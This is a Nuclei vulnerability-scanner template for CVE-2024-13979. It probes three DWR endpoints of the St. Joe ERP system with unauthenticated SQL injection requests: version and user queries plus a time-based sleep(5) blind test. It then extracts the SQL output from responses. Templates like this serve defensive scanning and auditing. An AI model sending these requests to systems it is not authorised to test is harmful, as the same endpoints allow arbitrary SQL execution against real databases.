id: CVE-2024-13979-alt

info:
  name: St. Joe ERP System - SQL Injection (Alternative Endpoints)
  author: anudeepadi
  severity: critical
  description: |
    St. Joe ERP system contains multiple SQL injection vulnerabilities in various DWR endpoints
    including ResultSetConvertor and other query interfaces, allowing unauthenticated remote attackers 
    to execute arbitrary SQL commands.
  reference:
    - https://blog.csdn.net/qq_41904294/article/details/144240396
    - https://github.com/adysec/POC/blob/main/wpoc/%E5%9C%A3%E4%B9%94ERP/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2024-13979
    cwe-id: CWE-89
  metadata:
    verified: true
    max-request: 3
  tags: cve,cve2024,sqli,stjoe,erp,dwr,unauth

http:
  - raw:
      # Test SingleRowQueryConvertor endpoint
      - |
        POST /erp/dwr/call/plaincall/SingleRowQueryConvertor.queryForString.dwr HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Content-Type: text/plain
        Accept: */*
        Connection: close
        
        callCount=1
        windowName=
        c0-scriptName=SingleRowQueryConvertor
        c0-methodName=queryForString
        c0-id=0
        c0-param0=string:select%20user()
        batchId=0
        page=/erp/login.action
        httpSessionId=
        scriptSessionId=

      # Test ResultSetConvertor endpoint
      - |
        POST /erp/dwr/call/plaincall/ResultSetConvertor.queryForMapWithDefaultValues.dwr HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Content-Type: text/plain
        Accept: */*
        Connection: close
        
        callCount=1
        windowName=
        c0-scriptName=ResultSetConvertor
        c0-methodName=queryForMapWithDefaultValues
        c0-id=0
        c0-param0=string:select%20@@version
        c0-param1=string:{}
        batchId=0
        page=/erp/login.action
        httpSessionId=
        scriptSessionId=

      # Test with time-based blind SQL injection
      - |
        POST /erp/dwr/call/plaincall/NamedParameterSingleRowQueryConvertor.queryForString.dwr HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Content-Type: text/plain
        Accept: */*
        Connection: close
        
        callCount=1
        windowName=
        c0-scriptName=NamedParameterSingleRowQueryConvertor
        c0-methodName=queryForString
        c0-id=0
        c0-param0=string:select%20*%20from%20dual%20where%201=1%20and%20sleep(5)
        c0-param1=string:{}
        batchId=0
        page=/erp/login.action
        httpSessionId=
        scriptSessionId=

    stop-at-first-match: true
    
    matchers-condition: or
    matchers:
      - type: dsl
        dsl:
          - 'contains(body, "dwr.engine._remoteHandleCallback") && contains(body, "s0=")'
          - 'duration >= 5'
        condition: or

      - type: word
        part: body
        words:
          - "dwr.engine._remoteHandleCallback"
          - "queryForString"
          - "s0="
        condition: and

      - type: regex
        part: body
        regex:
          - 'root@[^\s]+'
          - '\w+@localhost'
          - 'Database:.*\w+'
        condition: or

    extractors:
      - type: regex
        name: sql_output
        part: body
        regex:
          - 's0="([^"]+)";'
        group: 1
